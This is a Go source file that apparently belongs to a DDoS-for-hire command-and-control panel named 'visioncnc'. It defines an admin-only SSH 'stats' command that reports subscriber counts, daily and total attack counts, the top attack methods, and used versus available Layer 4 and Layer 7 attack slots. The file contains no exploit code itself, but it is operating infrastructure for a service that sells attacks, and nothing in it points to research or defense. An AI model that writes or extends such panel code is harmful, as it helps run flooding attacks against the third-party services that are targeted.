package cmds

import (
	"fmt"
	"io"
	"strings"
	"visioncnc/database"
	"visioncnc/utils"

	"github.com/gliderlabs/ssh"
)

// StatsCommand shows a dashboard of attack and user statistics
type StatsCommand struct{}

func (c *StatsCommand) Name() string        { return "stats" }
func (c *StatsCommand) AdminOnly() bool      { return true }
func (c *StatsCommand) Aliases() []string    { return []string{"statistics"} }

func (c *StatsCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	theme := utils.GetTheme()
	config, err := utils.LoadConfig("assets/config.json")
	if err != nil {
		fmt.Fprintln(output, theme.Colors.Error+"Failed to load config."+theme.Colors.Reset)
		return
	}

	totalUsers := db.GetTotalUsers()
	activeUsers := db.GetTotalActiveUsers()
	expiredUsers := db.GetTotalExpiredUsers()
	todayAttacks := db.GetTodayAttacksCount()
	totalAttacks := db.GetTotalAttacksCount()
	topMethods := db.GetTopMethods(5)

	usedL4 := db.GetCurrentAttacksLengthByGroup("LAYER 4")
	usedL7 := db.GetCurrentAttacksLengthByGroup("LAYER 7")
	totalL4 := config.Layer_slots["LAYER 4"]
	totalL7 := config.Layer_slots["LAYER 7"]

	l4Limit := fmt.Sprintf("%d", totalL4)
	l7Limit := fmt.Sprintf("%d", totalL7)
	if totalL4 == 0 {
		l4Limit = "∞"
	}
	if totalL7 == 0 {
		l7Limit = "∞"
	}

	sep := strings.Repeat("═", 40)
	fmt.Fprintf(output, "%s%s%s\n", theme.Colors.TableHeader, sep, theme.Colors.Reset)
	fmt.Fprintf(output, "%s  Statistics%s\n", theme.Colors.TableHeader, theme.Colors.Reset)
	fmt.Fprintf(output, "%s%s%s\n", theme.Colors.TableHeader, sep, theme.Colors.Reset)

	fmt.Fprintf(output, "  Total Users     : %d (%d active, %d expired)\n", totalUsers, activeUsers, expiredUsers)
	fmt.Fprintf(output, "  Attacks Today   : %d\n", todayAttacks)
	fmt.Fprintf(output, "  Attacks (All)   : %d\n", totalAttacks)

	fmt.Fprintln(output)
	fmt.Fprintf(output, "  Top Methods (today)\n")
	if len(topMethods) == 0 {
		fmt.Fprintln(output, "    (none)")
	} else {
		for i, s := range topMethods {
			fmt.Fprintf(output, "    #%d  %-14s — %d attacks\n", i+1, s.Method, s.Count)
		}
	}

	fmt.Fprintln(output)
	fmt.Fprintf(output, "  Layer Usage Now\n")
	fmt.Fprintf(output, "    LAYER 4   : %d/%s slots\n", usedL4, l4Limit)
	fmt.Fprintf(output, "    LAYER 7   : %d/%s slots\n", usedL7, l7Limit)

	fmt.Fprintf(output, "%s%s%s\n", theme.Colors.TableHeader, sep, theme.Colors.Reset)
}

func init() {
	CommandMap["stats"] = &StatsCommand{}
}
